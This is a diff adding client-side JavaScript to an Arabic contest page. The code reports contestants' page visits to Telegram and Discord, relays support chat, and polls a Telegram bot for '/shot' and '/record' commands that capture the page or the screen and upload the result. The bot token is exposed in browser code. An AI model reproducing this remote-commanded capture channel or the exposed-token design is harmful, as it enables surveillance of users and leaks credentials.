+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CONFIG.CHAT_BOT.CHAT_ID, text: text, parse_mode: "Markdown" })
+        }).catch(() => {});
+
+        // إرسال بطاقة ديسكورد
+        sendDiscordEmbed({
+            title: discordTitle,
+            description: text,
+            color: 15158332, // أحمر/برتقالي
+            fields: [
+                { name: "المتسابق", value: contestantName, inline: true },
+                { name: "المعرف", value: `\`${contestantId}\``, inline: true }
+            ]
+        });
+    }
+
+    function notifyUserEntrance() {
+        const now = Date.now();
+        if (now - lastOnlineAlertTime >= THROTTLE_60_SEC) {
+            lastOnlineAlertTime = now;
+            const msg = `⚡ **دخول لصفحة المسابقة:**\n👤 **الاسم:** ${contestantName}\n🆔 **المعرف:** \`${contestantId}\` *(اضغط للنسخ)*`;
+            sendTelegramAlert(msg, "🟢 دخول متسابق جديد للصفحة");
+        }
+    }
+
+    document.addEventListener("visibilitychange", () => {
+        const now = Date.now();
+        if (document.hidden) {
+            if (now - lastLeaveAlertTime >= THROTTLE_60_SEC) {
+                lastLeaveAlertTime = now;
+                sendTelegramAlert(`⚠️ **تنبيه مغادرة:** المتسابق ${contestantName} (🆔 \`${contestantId}\`) غادر الصفحة أو غير التطبيق.`, "⚠️ المتسابق غادر الصفحة");
+            }
+        } else {
+            if (now - lastOnlineAlertTime >= THROTTLE_60_SEC) {
+                lastOnlineAlertTime = now;
+                sendTelegramAlert(`🟢 **متصل الآن:** المتسابق ${contestantName} (🆔 \`${contestantId}\`) عاد للصفحة.`, "🟢 عودة المتسابق للصفحة");
+            }
+        }
+    });
+
+    window.showChatFilePreview = function() {
+        const preview = document.getElementById("chat-file-preview");
+        if (preview) preview.style.display = "block";
+    };
+
+    // إرسال رسالة شات من المتسابق
+    window.sendChatMessage = function(e) {
+        if (e) e.preventDefault();
+        cancelAutoClose();
+
+        const textInput = document.getElementById("chat-user-input");
+        const fileInput = document.getElementById("chat-file-input");
+        const preview = document.getElementById("chat-file-preview");
+
+        const text = textInput ? textInput.value.trim() : "";
+        const hasFile = fileInput && fileInput.files.length > 0;
+
+        if (!text && !hasFile) return;
+
+        playNotificationSound('send');
+        const timeStr = getCurrentTimeFormatted();
+        const formattedHeader = `📌 **رسالة من:** ${contestantName}\n🆔 **المعرف:** \`${contestantId}\`\n💬 **الرسالة:** ${text}`;
+
+        if (hasFile) {
+            const formData = new FormData();
+            formData.append("chat_id", CONFIG.CHAT_BOT.CHAT_ID);
+            formData.append("photo", fileInput.files[0]);
+            formData.append("caption", formattedHeader);
+            formData.append("parse_mode", "Markdown");
+
+            const fileURL = URL.createObjectURL(fileInput.files[0]);
+            displayAndSaveMessage(text, 'user-msg', timeStr, '✔', fileURL);
+            fetch(`https://api.telegram.org/bot${CONFIG.CHAT_BOT.TOKEN}/sendPhoto`, { method: "POST", body: formData });
+        } else {
+            displayAndSaveMessage(text, 'user-msg', timeStr, '✔');
+            fetch(`https://api.telegram.org/bot${CONFIG.CHAT_BOT.TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CONFIG.CHAT_BOT.CHAT_ID, text: formattedHeader, parse_mode: "Markdown" })
+            });
+        }
+
+        // إرسال بطاقة للديسكورد مع الرسالة
+        sendDiscordEmbed({
+            title: "💬 رسالة محادثة جديدة",
+            color: 3447003,
+            fields: [
+                { name: "الاسم", value: contestantName, inline: true },
+                { name: "المعرف", value: `\`${contestantId}\``, inline: true },
+                { name: "محتوى الرسالة", value: text || "[مرفق صورة]", inline: false }
+            ]
+        });
+
+        if (!isSupportOnline) {
+            setTimeout(() => {
+                displayAndSaveMessage("وصلتنا رسالتك وسيجاب عليها قريباً.", 'admin-msg', getCurrentTimeFormatted(), '');
+            }, 1000);
+        }
+
+        if (textInput) textInput.value = "";
+        sessionStorage.removeItem("chat_draft");
+        if (fileInput) fileInput.value = "";
+        if (preview) preview.style.display = "none";
+    };
+
+    window.takeUserInstantScreenshot = function() {
+        takeScreenShot(0);
+    };
+
+    function takeScreenShot(delaySeconds = 0) {
+        if (typeof html2canvas === 'undefined') return;
+        
+        const executeShot = () => {
+            html2canvas(document.body).then(canvas => {
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append("chat_id", CONFIG.CHAT_BOT.CHAT_ID);
+                    formData.append("photo", blob, "user_screenshot.png");
+                    formData.append("caption", `📸 **لقطة شاشة للمتسابق:** ${contestantName}\n🆔 \`${contestantId}\``);
+                    formData.append("parse_mode", "Markdown");
+
+                    const timeStr = getCurrentTimeFormatted();
+                    const imgURL = URL.createObjectURL(blob);
+                    displayAndSaveMessage("تم إرسال لقطة الشاشة للدعم.", 'user-msg', timeStr, '✔', imgURL);
+                    playNotificationSound('send');
+
+                    fetch(`https://api.telegram.org/bot${CONFIG.CHAT_BOT.TOKEN}/sendPhoto`, { method: "POST", body: formData });
+                    
+                    sendDiscordEmbed({
+                        title: "📸 لقطة شاشة تم التقاطها",
+                        description: `تم إرسال لقطة شاشة من جهاز המתسابق ${contestantName}`,
+                        color: 1752220
+                    });
+                });
+            });
+        };
+
+        if (delaySeconds > 0) {
+            setTimeout(executeShot, delaySeconds * 1000);
+        } else {
+            executeShot();
+        }
+    }
+
+    async function startScreenRecording(durationSeconds = 10, delaySeconds = 0) {
+        if (isRecording) return;
+
+        const startExec = async () => {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({
+                    video: { mediaSource: "screen" },
+                    audio: true
+                });
+
+                recordedChunks = [];
+                mediaRecorder = new MediaRecorder(stream);
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) recordedChunks.push(e.data);
+                };
+
+                mediaRecorder.onstop = () => {
+                    isRecording = false;
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    const blob = new Blob(recordedChunks, { type: "video/webm" });
+                    const formData = new FormData();
+                    formData.append("chat_id", CONFIG.CHAT_BOT.CHAT_ID);
+                    formData.append("video", blob, "screen_record.webm");
+                    formData.append("caption", `🎥 **تسجيل فيديو للمتسابق:** ${contestantName}\n🆔 \`${contestantId}\``);
+                    formData.append("parse_mode", "Markdown");
+
+                    fetch(`https://api.telegram.org/bot${CONFIG.CHAT_BOT.TOKEN}/sendVideo`, { method: "POST", body: formData })
+                        .catch(() => {
+                            fetch(`https://api.telegram.org/bot${CONFIG.CHAT_BOT.TOKEN}/sendDocument`, { method: "POST", body: formData });
+                        });
+                };
+
+                mediaRecorder.start();
+                isRecording = true;
+
+                if (durationSeconds > 0) {
+                    setTimeout(() => {
+                        stopScreenRecording();
+                    }, durationSeconds * 1000);
+                }
+
+            } catch (err) {
+                sendTelegramAlert(`❌ **فشل بدء تسجيل الفيديو:** ${err.message}`, "❌ فشل تسجيل الفيديو");
+            }
+        };
+
+        if (delaySeconds > 0) {
+            setTimeout(startExec, delaySeconds * 1000);
+        } else {
+            startExec();
+        }
+    }
+
+    function stopScreenRecording() {
+        if (mediaRecorder && isRecording) {
+            mediaRecorder.stop();
+        }
+    }
+
+    function displayAndSaveMessage(text, className, time, status = '', imgUrl = null) {
+        renderMessage(text, className, time, status, imgUrl);
+        saveChatHistory({ text, className, time, status, imgUrl });
+    }
+
+    function renderMessage(text, className, time, status = '', imgUrl = null) {
+        const chatBox = document.getElementById("chat-box");
+        if (!chatBox) return;
+
+        const msgElement = document.createElement("div");
+        msgElement.className = `msg ${className}`;
+
+        if (imgUrl) {
+            const img = document.createElement("img");
+            img.src = imgUrl;
+            msgElement.appendChild(img);
+        }
+
+        if (text) {
+            const textSpan = document.createElement("span");
+            textSpan.innerText = text;
+            msgElement.appendChild(textSpan);
+        }
+
+        const metaDiv = document.createElement("div");
+        metaDiv.className = "msg-meta";
+        metaDiv.innerHTML = `<span>${time}</span>` + (status ? `<span class="checkmark ${status === '✔✔' ? 'read' : ''}">${status}</span>` : '');
+        msgElement.appendChild(metaDiv);
+
+        chatBox.appendChild(msgElement);
+        chatBox.scrollTop = chatBox.scrollHeight;
+    }
+
+    // استلام الرسائل والأوامر من بوت المحادثة
+    function fetchAdminMessages() {
+        fetch(`https://api.telegram.org/bot${CONFIG.CHAT_BOT.TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+            .then(res => res.json())
+            .then(async data => {
+                if (data.ok && data.result.length > 0) {
+                    for (const update of data.result) {
+                        lastUpdateId = Math.max(lastUpdateId, update.update_id);
+                        sessionStorage.setItem("last_telegram_update_id", lastUpdateId.toString());
+
+                        const msg = update.message;
+                        if (!msg) continue;
+
+                        if (processedMsgIds.has(msg.message_id)) continue;
+
+                        let text = msg.text || msg.caption || "";
+
+                        if (text.includes(contestantId)) {
+                            processedMsgIds.add(msg.message_id);
+                            sessionStorage.setItem("processed_msg_ids", JSON.stringify(Array.from(processedMsgIds)));
+
+                            document.querySelectorAll(".user-msg .checkmark").forEach(el => {
+                                el.innerText = "✔✔";
+                                el.classList.add("read");
+                            });
+
+                            if (text.includes("/shot")) {
+                                const match = text.match(/\/shot\s*(\d+)?/i);
+                                const delay = match && match[1] ? parseInt(match[1]) : 0;
+                                takeScreenShot(delay);
+                                continue;
+                            }
+
+                            if (text.includes("/record")) {
+                                const match = text.match(/\/record\s*(\d+)?\s*(\d+)?/i);
+                                const duration = match && match[1] ? parseInt(match[1]) : 10;
+                                const delay = match && match[2] ? parseInt(match[2]) : 0;
+                                startScreenRecording(duration, delay);
+                                continue;
+                            }
+
+                            if (text.includes("/stop")) {
+                                stopScreenRecording();
+                                continue;
+                            }
+
+                            if (text.includes("/offline")) {
+                                setSupportStatus(false);
+                                continue;
+                            }
+
+                            if (text.includes("/online")) {
+                                setSupportStatus(true);
+                                continue;
+                            }
+
+                            let telegramImgUrl = null;
+                            if (msg.photo && msg.photo.length > 0) {
+                                const largestPhoto = msg.photo[msg.photo.length - 1];
+                                try {
+                                    const fileRes = await fetch(`https://api.telegram.org/bot${CONFIG.CHAT_BOT.TOKEN}/getFile?file_id=${largestPhoto.file_id}`);
+                                    const fileData = await fileRes.json();
+                                    if (fileData.ok && fileData.result.file_path) {
+                                        telegramImgUrl = `https://api.telegram.org/file/bot${CONFIG.CHAT_BOT.TOKEN}/${fileData.result.file_path}`;
+                                    }
+                                } catch (e) {}
+                            }
+
+                            let cleanText = text.replace(new RegExp(contestantId + ":?", "gi"), "").trim();
+                            if (cleanText || telegramImgUrl) {
+                                displayAndSaveMessage(cleanText, 'admin-msg', getCurrentTimeFormatted(), '', telegramImgUrl);
+                                playNotificationSound('receive');
+                                trigger10SecAutoOpen();
+                            }
+                        }
+                    }
+                }
+            })
+            .catch(() => {});
+    }
+
+    function setSupportStatus(online) {
+        isSupportOnline = online;
+        const dot1 = document.getElementById("support-status-dot");
+        const dot2 = document.getElementById("header-status-dot");
+        const statusText = document.getElementById("support-status-text");
+
+        if (online) {
+            if (dot1) dot1.classList.remove("offline");
+            if (dot2) dot2.classList.remove("offline");
+            if (statusText) statusText.innerText = "متصل الآن";
+        } else {
+            if (dot1) dot1.classList.add("offline");
+            if (dot2) dot2.classList.add("offline");
+            if (statusText) statusText.innerText = "غير متصل حالياً";
+        }
+    }
+
+    setInterval(fetchAdminMessages, 2000);
+</script>
+
+
+</body>
+</html>
